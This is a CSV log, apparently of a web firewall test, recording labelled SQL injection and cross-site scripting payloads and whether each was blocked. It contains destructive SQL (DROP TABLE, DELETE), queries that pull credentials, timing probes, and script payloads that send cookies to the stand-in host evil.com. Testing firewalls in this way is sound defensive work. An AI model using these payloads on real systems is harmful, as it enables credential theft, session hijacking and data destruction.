timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-07-04T22:06:14.955592,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
2026-07-04T22:06:15.181321,sqli,' AND SLEEP(5)--,1,401,False
2026-07-04T22:06:18.310146,sqli,admin'--,1,403,True
2026-07-04T22:06:22.126445,sqli,' AND 1=2--,1,403,True
2026-07-04T22:06:25.997518,sqli,' AND SLEEP(5)--,1,403,True
2026-07-04T22:06:26.878153,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
2026-07-04T22:06:29.843142,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
2026-07-04T22:06:30.211480,sqli,' AND SLEEP(5)--,1,401,False
2026-07-04T22:06:34.096595,sqli,'; DROP TABLE users--,1,403,True
2026-07-04T22:06:34.932079,sqli,'; DELETE FROM products WHERE 1=1--,1,403,True
2026-07-04T22:06:38.216607,sqli,'; WAITFOR DELAY '00:00:05'--,1,403,True
2026-07-04T22:06:41.500932,sqli,'; DELETE FROM products WHERE 1=1--,1,403,True
2026-07-04T22:06:42.648518,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
2026-07-04T22:06:44.076321,sqli,'; DROP TABLE users--,1,403,True
2026-07-04T22:06:47.526175,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
2026-07-04T22:06:47.834504,benign,normal_request,0,200,False
2026-07-04T22:06:53.520454,benign,normal_request,0,N/A,False
2026-07-04T22:06:59.260921,benign,normal_request,0,N/A,False
2026-07-04T22:07:03.212317,benign,normal_request,0,403,False
2026-07-04T22:07:08.437954,benign,normal_request,0,N/A,False
2026-07-04T22:07:08.943679,benign,normal_request,0,200,False
2026-07-04T22:07:09.659444,benign,normal_request,0,200,False
2026-07-04T22:07:15.116419,benign,normal_request,0,N/A,False
2026-07-04T22:07:15.923680,benign,normal_request,0,200,False
2026-07-04T22:07:21.139601,benign,normal_request,0,N/A,False
2026-07-04T22:07:26.652971,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-04T22:07:29.736740,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
2026-07-04T22:07:34.762983,xss,<a href='javascript:alert(1)'>click</a>,1,403,True
2026-07-04T22:07:39.168233,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
2026-07-04T22:07:43.846671,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
2026-07-04T22:07:44.669689,xss,<iframe src='javascript:alert(1)'>,1,403,True
